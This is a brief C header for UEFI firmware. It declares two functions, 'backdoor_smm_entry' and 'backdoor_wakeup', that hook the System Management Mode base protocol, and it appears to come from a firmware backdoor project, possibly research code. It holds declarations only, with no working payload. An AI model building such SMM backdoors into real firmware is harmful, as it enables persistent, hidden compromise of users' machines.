#ifndef __SMM_H__
#define __SMM_H__


#include "Protocol/SmmBase.h"

void backdoor_smm_entry(EFI_SMM_BASE_PROTOCOL* );

EFI_STATUS backdoor_wakeup();

#endif
